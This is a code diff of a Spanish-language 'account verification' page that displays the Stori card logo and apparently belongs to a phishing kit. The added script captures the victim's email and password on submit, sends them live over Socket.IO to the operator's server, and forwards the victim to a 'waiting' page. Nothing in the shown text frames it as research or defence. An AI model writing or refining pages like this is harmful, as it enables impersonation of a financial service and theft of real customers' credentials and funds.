@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verificación de cuenta</title>
-  <link rel="stylesheet" href="style.css">
   <style>
     body {
       background-color: #f3f6fb;
@@ -65,43 +64,39 @@
 <body>
   <div class="container">
     <div class="logo">
-      <!-- Puedes cambiar este ícono si quieres -->
       <img src="https://stori.card/img/logo.svg" alt="logo" />
     </div>
     <h2>Verificación de cuenta</h2>
     <p>Ingrese su correo y contraseña para continuar</p>
-   <form id="login-form">
-  <input type="text" id="usuario" placeholder="Correo electrónico" required />
-  <input type="password" id="clave" placeholder="Contraseña" required />
-  <button type="submit">Continuar</button>
-</form>
-
+    <form id="login-form">
+      <input type="text" id="usuario" placeholder="Correo electrónico" required />
+      <input type="password" id="clave" placeholder="Contraseña" required />
+      <button type="submit">Continuar</button>
+    </form>
   </div>
 
-<!-- ... todo tu HTML ... -->
-
-
-
- <!-- Socket.IO -->
-<script src="/socket.io/socket.io.js"></script>
+  <!-- Scripts al final del body -->
   <script src="/socket.io/socket.io.js"></script>
-  <script src="requests.js"></script>
+  <script>
+    const socket = io();
 
-<script>
-  const socket = io();
+    window.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('login-form');
 
-  socket.on('redirect', (url) => {
-    console.log("🔁 Redirigiendo a:", url);
-    window.location.href = url;
-  });
-</script>
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
 
-<!-- Tu script que envía datos -->
-<script src="requests.js"></script>
+          const correo = document.getElementById('usuario').value;
+          const contrasena = document.getElementById('clave').value;
 
-<!-- (Si usás main.js para algo más) -->
-<script src="main.js"></script>
+          socket.emit('dataForm', { correo, contrasena });
 
-  
+          // Ir a la pantalla de espera
+          window.location.href = 'opciones.html';
+        });
+      }
+    });
+  </script>
 </body>
 </html>
